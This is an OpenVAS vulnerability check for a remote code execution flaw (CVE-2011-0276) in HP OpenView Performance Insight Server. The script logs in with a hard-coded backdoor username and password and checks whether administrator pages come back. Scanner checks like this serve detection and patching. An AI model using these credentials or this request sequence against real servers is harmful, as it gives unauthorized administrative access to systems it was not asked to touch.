###############################################################################
# OpenVAS Vulnerability Test
#
# HP OpenView Performance Insight Server 'doPost()' Remote Arbitrary Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46079");
  script_xref(name:"URL", value:"http://www.hp.com/");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-034/");
  script_xref(name:"URL", value:"http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02695453");
  script_oid("1.3.6.1.4.1.25623.1.0.103060");
  script_version("2019-05-13T14:05:09+0000");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2011-02-03 16:40:04 +0100 (Thu, 03 Feb 2011)");
  script_bugtraq_id(46079);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2011-0276");

  script_name("HP OpenView Performance Insight Server 'doPost()' Remote Arbitrary Code Execution Vulnerability");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_hp_performance_insight_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("hp_openview_insight/installed");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"HP OpenView Performance Insight Server is prone to a remote
  code-execution vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code with
  SYSTEM-level privileges. Successful exploits will completely compromise affected computers.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");

port = get_http_port(default:8080);
if(!get_dir_from_kb(port:port,app:"hp_openview_insight"))exit(0);

host = http_host_name(port:port);

userpass = "hch908v:z6t0j$+i";

url = "/reports/home?context=home&type=header&ov_user=hch908v";

req = string("GET ", url," HTTP/1.1\r\n", "Host: ", get_host_name(),"\r\n\r\n");
resp = http_keepalive_send_recv(port:port, data:req);
if("401 Unauthorized" >!< resp)exit(0); # just to be sure

userpass64 = base64(str:userpass);

req = string("GET ", url," HTTP/1.1\r\n",
	     "Host: ", host,"\r\n",
	     "Authorization: Basic ",userpass64,"\r\n",
	     "\r\n");
resp = http_keepalive_send_recv(port:port, data:req);

if("Log off hch908v" >< resp && "Administration</a>" >< resp) {
  msg = string("The Scanner was able to access the URL '",url, "'\nusing username 'hch908v' and password 'z6t0j$+i'.\n");
  security_message(port:port,data:msg);
  exit(0);
}

exit(0);
